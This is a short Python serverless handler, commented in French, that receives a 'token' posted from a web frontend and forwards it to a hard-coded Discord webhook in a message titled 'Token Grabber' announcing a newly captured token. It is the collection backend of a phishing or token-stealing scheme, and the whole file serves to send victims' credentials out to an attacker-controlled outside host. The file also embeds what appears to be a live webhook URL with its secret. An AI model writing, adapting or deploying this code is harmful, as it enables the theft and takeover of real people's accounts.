import json
import requests

def handler(event, context):
    # Vérifier que c'est une requête POST
    if event['httpMethod'] != 'POST':
        return {
            'statusCode': 405,
            'body': 'Méthode non autorisée'
        }

    # Récupérer les données envoyées depuis le frontend
    body = json.loads(event['body'])
    token = body.get('token')

    if not token:
        return {
            'statusCode': 400,
            'body': 'Token manquant'
        }

    # Ton Webhook Discord pour recevoir les tokens
    WEBHOOK_URL = "https://discord.com/api/webhooks/1543762448643915799/o9B-rPF0YGlhtO00A48susJVoQEtou5nDakvei0zLorngDfdvh0KotsbULWKBnpVFTYG"

    # Préparer le payload pour Discord
    payload = {
        "content": f"🎣 Nouveau token capturé !",
        "embeds": [{
            "title": "Token Grabber",
            "color": 15158332,
            "fields": [
                {"name": "Token", "value": f"```{token}```"},
                {"name": "Heure", "value": f"{event.get('headers', {}).get('x-vercel-timestamp', 'Inconnue')}"}
            ]
        }]
    }

    # Envoyer à Discord
    try:
        requests.post(WEBHOOK_URL, json=payload)
        return {
            'statusCode': 200,
            'body': json.dumps({"status": "success"})
        }
    except Exception as e:
        return {
            'statusCode': 500,
            'body': json.dumps({"status": "error", "message": str(e)})
        }
